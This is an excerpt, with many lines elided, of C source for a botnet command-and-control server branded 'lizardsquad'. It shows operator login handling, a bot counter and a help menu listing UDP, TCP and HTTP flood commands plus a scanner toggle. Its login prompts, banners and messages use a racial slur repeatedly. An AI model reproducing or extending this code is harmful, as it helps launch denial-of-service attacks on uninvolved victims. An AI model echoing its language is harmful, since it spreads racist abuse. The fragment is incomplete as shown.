...
void broadcast(char *msg, int us, char *sender)
{
        ...
        for(i = 0; i < MAXFDS; i++)
        {
                ...
                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[31m%s@lizardsquad: ", accounts[find_line].username, 13, MSG_NOSIGNAL);
                else send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
...
void *BotWorker(void *sock) {
    ...
    while(j!=i-1) {
        ...
        if(send(datafd, "\x1b[31mNiggername: \x1b[31m ", 22, MSG_NOSIGNAL) == -1) goto end;
        ...
        if(send(datafd, "\x1b[31mPassword: \x1b[31m ", 22, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        trim(buf);
		...
		sprintf(failed_line1, "\x1b[36mWRONG PASSWORD NIGGER!!\r\n");
		...
		sprintf(ascii_banner_line1, "\x1b[31m       _       _____     _ \r\n");
		sprintf(ascii_banner_line2, "\x1b[31m      | |     |  _  |   | |\r\n");
		sprintf(ascii_banner_line3, "\x1b[31m  __ _| | __ _| |/' | __| |\r\n");
		sprintf(ascii_banner_line4, "\x1b[31m / _` | |/ _` |  /| |/ _` |\r\n");
		sprintf(ascii_banner_line5, "\x1b[31m| (_| | | (_| \ |_/ / (_| |\r\n");
		sprintf(ascii_banner_line6, "\x1b[31m \__,_|_|\__, |\___/ \__,_|\r\n");
		sprintf(ascii_banner_line7, "\x1b[31m          __/ |            \r\n");
		sprintf(ascii_banner_line8, "\x1b[31m         |___/             \r\n");
		sprintf(ascii_banner_line9, "\r\n");	
		sprintf(welcome_line,       "\x1b[31m        #\x1b[34m----- \x1b[31mBot Count: %d\x1b[34m -----\x1b[31m#\r\n", BotsConnected(), OperatorsConnected); 
		sprintf(banner_bot_count, 	"\r\n\x1b[31m    #\x1b[34m-------- \x1b[31mWelcome Nigger %s\x1b[34m --------\x1b[31m#\r\n", accounts[find_line].username);
		...
		if(send(datafd, "\x1b[31m%s@lizardsquad: ", accounts[find_line].username, 12, MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &TitleWriter, sock);
		...
		while(fdgets(buf, sizeof buf, datafd) > 0)
		{
			...
			if(strstr(buf, "HELP")) {
				...
				sprintf(ls1,  "   \r\n\x1b[31m#--- \x1b[34mMETHODS \x1b[31m---#\r\n\r\n");
				sprintf(ls2,  "   \x1b[31m- UDP - \x1b[34m!* UDP Victim Port Time 32 0 10\r\n");
				sprintf(ls3,  "   \x1b[31m- TCP - \x1b[34m!* TCP Victim Port Time 32 all 0 10\r\n");
				sprintf(ls4,  "   \x1b[31m- HTTP - \x1b[34m!* HTTP Url Time\r\n");
				sprintf(ls5,  "   \x1b[31m- CNC - \x1b[34m!* CNC IP PORT TIME\r\n"); 
                                sprintf(ls6,  "   \x1b[31m- SCANNER - \x1b[34m!* SCANNER ON|OFF\r\n");
			...
			if(strstr(buf, "TOS")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char tos1  [80];
				sprintf(tos1,  "\r\n\x1b[34mTwitter: \x1b[31mhttps://twitter.com/LizardL4nds\r\n\r\n");
			...
			if(strstr(buf, "LOGOUT")) {
				...
				sprintf(logoutmessage, "Bye Nigger, %s", accounts[find_line].username);
				if(send(datafd, logoutmessage, strlen(logoutmessage), MSG_NOSIGNAL) == -1)goto end;
				sleep(5);
				goto end;
			}
                trim(buf);
                if(send(datafd, "\x1b[31m%s@lizardsquad: ", accounts[find_line].username, 11, MSG_NOSIGNAL) == -1) goto end;
